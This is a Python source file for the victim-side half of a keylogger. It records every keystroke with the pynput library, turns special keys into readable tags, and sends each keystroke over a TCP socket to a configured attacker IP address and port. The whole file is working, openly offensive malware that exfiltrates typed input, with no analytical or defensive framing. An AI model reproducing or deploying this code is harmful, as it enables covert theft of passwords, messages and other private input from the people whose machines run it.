#Client side (VICTIM) script to log the keystrokes and send to the attacker port which is being listened on.
import socket
import time
from pynput import keyboard

# ================================
# CONFIGURATION OPTIONS
# ================================
ATTACKER_IP = "192.168.1.100"  # Replace with the attacker server's IP address
ATTACKER_PORT = 9999           # Must match the port used in the attacker server

# ================================
# Establish a connection to the attacker server
# ================================
def create_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        print(f"[+] Connected to attacker server at {ATTACKER_IP}:{ATTACKER_PORT}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        s = None
    return s

conn = create_connection()

# ================================
# Function to send data over the network
# ================================
def send_data(data):
    global conn
    if conn:
        try:
            conn.sendall(data.encode())
        except Exception as e:
            print(f"[-] Failed to send data: {e}")

# ================================
# Function to process and send keystrokes
# ================================
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_data = key.char
        else:
            # Map some special keys to readable strings
            special_keys = {
                keyboard.Key.space: " [SPACE] ",
                keyboard.Key.enter: " [ENTER]\n",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.shift: " [SHIFT] ",
                keyboard.Key.ctrl_l: " [CTRL] ",
                keyboard.Key.alt_l: " [ALT] ",
                keyboard.Key.esc: " [ESC] ",
                keyboard.Key.tab: " [TAB] "
            }
            key_data = special_keys.get(key, f" [{key}] ")
        send_data(key_data)
    except Exception as e:
        print(f"[-] Error recording key: {e}")

# ================================
# Start the keylogger
# ================================
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print("[*] Keylogger started. Press CTRL+C to stop.")
    try:
        start_keylogger()
    except KeyboardInterrupt:
        print("\n[*] Keylogger stopped.")
    finally:
        if conn:
            conn.close()
